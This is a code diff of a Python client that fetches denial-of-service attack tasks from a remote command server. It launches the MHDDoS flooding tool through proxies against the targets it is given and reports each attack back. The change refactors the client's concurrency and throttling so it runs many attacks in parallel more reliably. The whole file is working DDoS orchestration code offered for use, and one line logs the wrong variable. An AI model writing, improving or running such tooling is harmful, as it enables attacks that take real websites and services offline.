@@ -1,25 +1,25 @@
 #!/usr/bin/env python3
 import argparse
 import json
+import os
+
 import psutil
 import subprocess
 import sys
 
 from collections import namedtuple
-from logging import basicConfig, getLogger
-from proxies import update_file
-from queue import Queue
+from concurrent.futures import ThreadPoolExecutor, wait
+from logging import basicConfig, getLogger, INFO, DEBUG
 from socket import gethostname
-from threading import Thread
 from time import sleep
 from urllib.request import urlopen, Request
 
-basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
+basicConfig(format='[%(asctime)s - %(levelname)-5s] [%(name)s]: %(message)s',
             datefmt="%H:%M:%S")
 
 getLogger('proxies').setLevel("CRITICAL")
 logger = getLogger("Bot Runner")
-logger.setLevel("INFO")
+logger.setLevel(DEBUG if os.environ.get("DEBUG") else INFO)
 
 host = "https://ua-cyber.space"
 
@@ -28,44 +28,6 @@ counters = f"{host}/api/v2/tasks/stats/"
 
 loop_time = 60
 RETRY_PERIOD_SEC = 30
-
-
-class Worker(Thread):
-    """Thread executing tasks from a given tasks queue"""
-
-    def __init__(self, tasks):
-        Thread.__init__(self)
-        self.tasks = tasks
-        self.daemon = True
-        self.start()
-
-    def run(self):
-        while True:
-            func, args, kargs = self.tasks.get()
-            try:
-                func(*args, **kargs)
-            except Exception as e:
-                print(e)
-            finally:
-                self.tasks.task_done()
-
-
-class ThreadPool:
-    """Pool of threads consuming tasks from a queue"""
-
-    def __init__(self, num_threads):
-        self.tasks = Queue(num_threads)
-        for _ in range(num_threads):
-            Worker(self.tasks)
-
-    def add_task(self, func, *args, **kargs):
-        """Add a task to the queue"""
-        self.tasks.put((func, args, kargs))
-
-    def wait_completion(self):
-        """Wait for completion of all the tasks in the queue"""
-        self.tasks.join()
-
 
 l7 = ["GET", "POST", "OVH", "STRESS", "DYN", "DOWNLOADER", "SLOW", "HEAD", "NULL", "COOKIE",
       "PPS", "EVEN", "GSB", "DGB", "AVB", "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB"]
@@ -77,7 +39,7 @@ def customDecoder(Obj):
     return namedtuple('X', Obj.keys())(*Obj.values())
 
 
-def runner(config, cpu_limit, threads_limit=0):
+def as_mhddos_args(config, threads_limit=0):
     if int(config.Duration) > loop_time:
         period = loop_time
     else:
@@ -115,25 +77,19 @@ def runner(config, cpu_limit, threads_limit=0):
             logger.info(
                 'No we cant run the LEVEL7 attacks without proxy. Skipping')
             return
+    return params
+
+
+def run_mhddos(start_args: list):
     try:
-        cpu_usage = psutil.cpu_percent(4)
-        while cpu_usage > cpu_limit:
-            logger.info(f"The CPU load {cpu_usage} is too high. Thread waiting...")
-            sleep(loop_time)
-            cpu_usage = psutil.cpu_percent(4)
-        subprocess.run([sys.executable, "MHDDoS/start.py", *params])
-        try:
-            req = Request(counters)
-            req.add_header('Content-Type', 'application/json')
-            response = urlopen(req, str(json.dumps(params)).encode('utf-8'))
-            st = json.dumps(response.read().decode())
-            logger.info(f"The system works good! Thanks :D")
-        except Exception as error:
-            pass
-    except KeyboardInterrupt:
-        logger.info("Shutting down... Ctrl + C")
-    except Exception as error:
-        logger.info(f"OOPS... {config.Dst} -> Issue: {error}")
+        logger.debug(f"Starting now: MHDDoS/start.py {' '.join(mhddos_args)}")
+        subprocess.run([sys.executable, "MHDDoS/start.py", *start_args])
+        req = Request(counters)
+        req.add_header('Content-Type', 'application/json')
+        response = urlopen(req, str(json.dumps(start_args)).encode('utf-8'))
+        st = json.dumps(response.read().decode())
+    except Exception as ex:
+        logger.info(f"OOPS... {start_args[:2]} -> Issue: {ex}")
 
 
 if __name__ == '__main__':
@@ -174,7 +130,6 @@ if __name__ == '__main__':
                         default=True,
                         help="Use proxies")
 
-
     args = parser.parse_args()
     pool_size = args.max_attacks
     max_threads = args.attack_threads_limit
@@ -183,11 +138,11 @@ if __name__ == '__main__':
 
     logger.info(f"Fetch tasks URL: {url}")
 
+    pool = ThreadPoolExecutor(max_workers=pool_size)
     try:
-        pool = ThreadPool(pool_size)
-
         if use_proxy:
             logger.info("Get fresh proxies. Please wait...")
+            from proxies import update_file  # import it here locally, otherwise logging config is screwed
             update_file()
         else:
             with open('MHDDoS/files/proxies/proxylist.txt', 'w') as emty:
@@ -196,18 +151,37 @@ if __name__ == '__main__':
         while True:
             logger.info("Getting fresh tasks from the server!")
             try:
+                ftrs = []
                 for conf in json.loads(urlopen(url).read(), object_hook=customDecoder):
-                    pool.add_task(runner, conf, cpu_limit, threads_limit=max_threads)
-                    sleep(loop_time / 4)
-                pool.wait_completion()
-
+                    mhddos_args = as_mhddos_args(conf, threads_limit=max_threads)
+                    if mhddos_args:
+                        cpu_usage = psutil.cpu_percent(4)
+                        while cpu_usage > cpu_limit:
+                            logger.info(f"The CPU load {cpu_usage} is too high. Thread waiting...")
+                            sleep(loop_time)
+                            cpu_usage = psutil.cpu_percent(4)
+                        while True:
+                            pending_count = pool._work_queue.qsize()
+                            logger.debug(f"Currently pending attacks: {pending_count}")
+                            if pending_count > pool_size:
+                                logger.info(f"Number of pending attacks [{pending_count}] "
+                                            f"is already enough. Waiting...")
+                                sleep(loop_time / 4)
+                            else:
+                                break
+                        logger.info("The system works good! Thanks :P ")
+                        logger.info(f"Scheduling next attack for: {conf.Dst}")
+                        ftrs.append(pool.submit(run_mhddos, mhddos_args))
+                        sleep(loop_time / 10)
+                wait(ftrs)
             except Exception as error:
                 logger.critical(f"OOPS... We faced an issue: {error}")
                 logger.info(f"Retrying in {RETRY_PERIOD_SEC}")
                 sleep(RETRY_PERIOD_SEC)
-
     except KeyboardInterrupt:
         logger.info("Shutting down... Ctrl + C")
     except Exception as error:
         logger.critical(f"OOPS... We faced an issue: {error}")
         logger.info("Please restart the tool! Thanks")
+    finally:
+        pool.shutdown(wait=False, cancel_futures=True)
